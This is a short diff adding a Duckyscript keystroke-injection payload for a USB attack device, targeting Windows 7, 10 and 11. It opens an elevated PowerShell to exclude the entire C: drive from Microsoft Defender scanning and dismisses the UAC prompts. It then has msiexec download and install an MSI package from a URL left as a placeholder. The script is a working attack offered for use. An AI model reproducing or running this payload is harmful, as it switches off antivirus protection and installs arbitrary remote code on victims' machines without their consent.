@@ -1,1 +1,28 @@
+REM Title: .MSI Remote Execution
+REM Author: Arithefirst
+REM Target:  Windows 7/10/11
+REM Duckyscript Version: 3.0
+REM Category: Execution
+REM adds an exclusion to the C:\ and then downloads and runs an msi file from a specified link
 
+REM Replace "url.goeshere" with the uri of your file
+DEFINE #URLconst url.goeshere
+DELAY 2000
+
+REM Add C:\ exclusion
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -command Add-MpPreference -ExclusionPath "C:"
+CTRL-SHIFT ENTER
+DELAY 500
+ALT y
+DELAY 1000
+
+REM Remote execution of MSI File with msiexec
+GUI r
+DELAY 500
+STRING msiexec /i #URLconst
+ENTER
+DELAY 500
+ALT y
+DELAY 1000
